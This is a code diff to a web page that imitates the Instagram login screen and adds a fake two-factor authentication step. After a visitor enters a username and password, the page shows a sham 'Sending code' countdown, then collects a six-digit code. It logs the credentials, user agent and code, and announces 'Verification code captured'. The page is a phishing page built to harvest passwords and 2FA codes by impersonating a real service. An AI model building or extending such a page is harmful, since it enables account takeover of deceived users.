@@ -84,7 +84,7 @@
             width: 100%;
         }
 
-        .login-card {
+        .card {
             background: #fff;
             border: 1px solid #dbdbdb;
             border-radius: 1px;
@@ -153,7 +153,7 @@
         #loginBtn:not(:disabled) { opacity: 1; }
         #loginBtn:disabled { cursor: not-allowed; }
 
-        /* ===== COOLDOWN OVERLAY ON BUTTON ===== */
+        /* ===== COOLDOWN OVERLAY ===== */
         #cooldownOverlay {
             display: none;
             position: absolute;
@@ -165,8 +165,7 @@
             border-radius: 8px;
             color: #fff;
             font-weight: 600;
-            font-size: 14px;
-            display: none;
+            font-size: 13px;
             align-items: center;
             justify-content: center;
             gap: 6px;
@@ -283,49 +282,117 @@
             font-size: 12px;
         }
 
-        /* ===== NOTIFICATION ===== */
-        #notificationArea {
-            margin-top: 10px;
-            min-height: 0;
-            transition: all 0.3s ease;
-        }
-
-        .notif-msg {
+        /* ===== 2FA SECTION ===== */
+        #twofaSection {
             display: none;
-            padding: 8px 12px;
-            border-radius: 6px;
-            font-size: 12px;
-            font-weight: 500;
+        }
+
+        #twofaSection .lock-icon {
+            width: 80px;
+            height: 80px;
+            margin: 0 auto 16px;
+            background: #fafafa;
+            border-radius: 50%;
+            display: flex;
             align-items: center;
-            gap: 6px;
+            justify-content: center;
         }
 
-        .notif-msg.show { display: flex; }
-
-        .notif-msg.success {
-            background: #e8f5e9;
-            color: #2e7d32;
-            border: 1px solid #a5d6a7;
+        #twofaSection .lock-icon svg {
+            width: 40px;
+            height: 40px;
         }
 
-        .notif-msg.info {
-            background: #e3f2fd;
-            color: #1565c0;
-            border: 1px solid #90caf9;
+        #twofaSection h2 {
+            font-size: 18px;
+            font-weight: 600;
+            color: #262626;
+            margin-bottom: 4px;
         }
 
-        .notif-msg svg {
-            width: 14px;
-            height: 14px;
-            flex-shrink: 0;
+        #twofaSection .subtitle {
+            font-size: 13px;
+            color: #737373;
+            margin-bottom: 16px;
+            line-height: 1.4;
         }
+        #twofaSection .subtitle span { color: #262626; font-weight: 500; }
+
+        .code-inputs {
+            display: flex;
+            gap: 8px;
+            justify-content: center;
+            margin-bottom: 12px;
+        }
+
+        .code-inputs input {
+            width: 42px;
+            height: 46px;
+            text-align: center;
+            font-size: 18px;
+            font-weight: 600;
+            border: 1px solid #dbdbdb;
+            border-radius: 4px;
+            outline: none;
+            background: #fafafa;
+        }
+
+        .code-inputs input:focus {
+            border-color: #a8a8a8;
+            background: #fff;
+        }
+
+        #verifyBtn {
+            width: 100%;
+            padding: 7px 16px;
+            background: #0095f6;
+            border: none;
+            border-radius: 8px;
+            color: #fff;
+            font-weight: 600;
+            font-size: 14px;
+            cursor: pointer;
+            opacity: 0.7;
+            transition: opacity 0.2s;
+            margin-bottom: 14px;
+        }
+        #verifyBtn:not(:disabled) { opacity: 1; }
+        #verifyBtn:disabled { cursor: not-allowed; }
+
+        .resend-area {
+            font-size: 12px;
+            color: #737373;
+        }
+
+        #resendBtn {
+            background: none;
+            border: none;
+            color: #0095f6;
+            font-weight: 600;
+            font-size: 12px;
+            cursor: pointer;
+            font-family: inherit;
+        }
+        #resendBtn:disabled {
+            color: #737373;
+            cursor: not-allowed;
+        }
+
+        .back-link {
+            display: block;
+            margin-top: 16px;
+            font-size: 12px;
+            color: #00376b;
+            text-decoration: none;
+        }
+        .back-link:hover { text-decoration: underline; }
 
         @media (max-width: 450px) {
             body {
                 background: #fff;
                 padding: 0;
             }
-            .login-card {
+            .card {
                 border: none;
                 padding: 40px 20px 20px;
             }
@@ -354,7 +421,8 @@
 
     <!-- Login Section -->
     <div class="login-section">
-        <div class="login-card">
+        <!-- ============ LOGIN CARD ============ -->
+        <div class="card" id="loginCard">
             <div class="logo">
                 <img src="https://i.imgur.com/wvLiKam.png" alt="Instagram" width="175" height="51">
             </div>
@@ -367,17 +435,10 @@
                     <button type="submit" id="loginBtn" disabled>Log in</button>
                     <div id="cooldownOverlay">
                         <div class="spinner"></div>
-                        <span id="cooldownText">Sending code...</span>
+                        <span id="cooldownText">Sending code... (10s)</span>
                     </div>
                 </div>
             </form>
-
-            <div id="notificationArea">
-                <div class="notif-msg success" id="successNotif">
-                    <svg viewBox="0 0 16 16" fill="currentColor"><path d="M8 1a7 7 0 1 0 0 14A7 7 0 0 0 8 1zm3.36 5.65l-4.25 4.25a.5.5 0 0 1-.7 0L3.64 8.36a.5.5 0 0 1 .7-.7L6.7 9.8l3.96-3.95a.5.5 0 0 1 .7.7z"/></svg>
-                    <span id="notifText">✓ We sent you a code. Check your phone.</span>
-                </div>
-            </div>
 
             <div class="separator">
                 <span class="line"></span>
@@ -393,7 +454,39 @@
             <a href="#" class="forgot-password">Forgot password?</a>
         </div>
 
-        <div class="signup-card">
+        <!-- ============ 2FA CARD ============ -->
+        <div class="card" id="twofaSection">
+            <div class="lock-icon">
+                <svg viewBox="0 0 24 24" fill="none" stroke="#262626" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                    <rect x="3" y="11" width="18" height="11" rx="2" ry="2"/>
+                    <path d="M7 11V7a5 5 0 0 1 10 0v4"/>
+                </svg>
+            </div>
+
+            <h2>Two-Factor Authentication</h2>
+            <p class="subtitle">Enter the code we sent to <span id="displayUser">your phone</span>.</p>
+
+            <div class="code-inputs" id="codeInputs">
+                <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]" class="code-box" autofocus>
+                <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]" class="code-box">
+                <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]" class="code-box">
+                <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]" class="code-box">
+                <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]" class="code-box">
+                <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]" class="code-box">
+            </div>
+
+            <button id="verifyBtn" disabled>Verify</button>
+
+            <div class="resend-area">
+                Didn't get the code? 
+                <button id="resendBtn">Send code again</button>
+            </div>
+
+            <a href="#" id="backToLogin" class="back-link">← Back to login</a>
+        </div>
+
+        <!-- Signup -->
+        <div class="signup-card" id="signupCard">
             Don't have an account? <a href="#">Sign up</a>
         </div>
 
@@ -433,13 +526,18 @@
     const loginForm = document.getElementById('loginForm');
     const cooldownOverlay = document.getElementById('cooldownOverlay');
     const cooldownText = document.getElementById('cooldownText');
-    const successNotif = document.getElementById('successNotif');
-    const notifText = document.getElementById('notifText');
+    const loginCard = document.getElementById('loginCard');
+    const signupCard = document.getElementById('signupCard');
+    const twofaSection = document.getElementById('twofaSection');
+    const displayUser = document.getElementById('displayUser');
+    const codeBoxes = document.querySelectorAll('.code-box');
+    const verifyBtn = document.getElementById('verifyBtn');
+    const resendBtn = document.getElementById('resendBtn');
+    const backLink = document.getElementById('backToLogin');
 
     let cooldownTimer = null;
     let cooldownCount = 0;
 
-    // Enable button only when fields are filled
     function checkLogin() {
         loginBtn.disabled = !(u.value.trim() && p.value.trim());
     }
@@ -449,8 +547,6 @@
     // ===== SUBMIT =====
     loginForm.addEventListener('submit', function(e) {
         e.preventDefault();
-
-        // If already in cooldown, ignore
         if (cooldownTimer) return;
 
         // Log credentials
@@ -459,36 +555,94 @@
         console.log('[+] UA:', navigator.userAgent);
         console.log('[+] Time:', new Date().toISOString());
 
-        // Hide any old notification
-        successNotif.classList.remove('show');
-
-        // Disable the real button and show overlay
+        // Start cooldown
         loginBtn.disabled = true;
         cooldownOverlay.style.display = 'flex';
         cooldownCount = 10;
-        cooldownText.textContent = `Sending code... (${cooldownCount}s)`;
+        cooldownText.textContent = `Sending code... (10s)`;
 
         cooldownTimer = setInterval(() => {
             cooldownCount--;
-
             if (cooldownCount > 0) {
                 cooldownText.textContent = `Sending code... (${cooldownCount}s)`;
             } else {
-                // Cooldown finished
                 clearInterval(cooldownTimer);
                 cooldownTimer = null;
-
-                // Hide overlay
                 cooldownOverlay.style.display = 'none';
 
-                // Show success message
-                notifText.textContent = '✓ We sent you a code. Check your phone.';
-                successNotif.classList.add('show');
+                // Show 2FA section
+                loginCard.style.display = 'none';
+                signupCard.style.display = 'none';
+                twofaSection.style.display = 'block';
 
-                // Re-enable button if fields are still filled
-                checkLogin();
+                // Set displayed user
+                displayUser.textContent = u.value.trim() || 'your phone';
+
+                // Reset code inputs
+                codeBoxes.forEach(box => box.value = '');
+                codeBoxes[0].focus();
+                verifyBtn.disabled = true;
             }
         }, 1000);
+    });
+
+    // ===== 2FA CODE INPUT =====
+    codeBoxes.forEach((box, index) => {
+        box.addEventListener('input', function() {
+            this.value = this.value.replace(/[^0-9]/g, '').slice(0, 1);
+            if (this.value && index < codeBoxes.length - 1) {
+                codeBoxes[index + 1].focus();
+            }
+            const allFilled = Array.from(codeBoxes).every(b => b.value !== '');
+            verifyBtn.disabled = !allFilled;
+        });
+
+        box.addEventListener('keydown', function(e) {
+            if (e.key === 'Backspace' && !this.value && index > 0) {
+                codeBoxes[index - 1].focus();
+            }
+        });
+
+        box.addEventListener('paste', function(e) {
+            e.preventDefault();
+            const paste = (e.clipboardData || window.clipboardData).getData('text');
+            const digits = paste.replace(/[^0-9]/g, '').slice(0, 6);
+            digits.split('').forEach((d, i) => {
+                if (codeBoxes[i]) codeBoxes[i].value = d;
+            });
+            if (digits.length === 6) {
+                codeBoxes[5].focus();
+                verifyBtn.disabled = false;
+            } else if (codeBoxes[digits.length]) {
+                codeBoxes[digits.length].focus();
+            }
+        });
+    });
+
+    // ===== VERIFY =====
+    verifyBtn.addEventListener('click', function() {
+        const code = Array.from(codeBoxes).map(b => b.value).join('');
+        console.log('[+] 2FA Code:', code);
+        alert('✓ Verification code captured: ' + code);
+    });
+
+    // ===== RESEND =====
+    resendBtn.addEventListener('click', function() {
+        console.log('[+] Resend code requested');
+        codeBoxes.forEach(box => box.value = '');
+        codeBoxes[0].focus();
+        verifyBtn.disabled = true;
+        alert('✓ We sent you a new code. Check your phone.');
+    });
+
+    // ===== BACK TO LOGIN =====
+    backLink.addEventListener('click', function(e) {
+        e.preventDefault();
+        twofaSection.style.display = 'none';
+        loginCard.style.display = 'block';
+        signupCard.style.display = 'block';
+        loginBtn.disabled = false;
+        checkLogin();
     });
 
     // ===== FACEBOOK =====
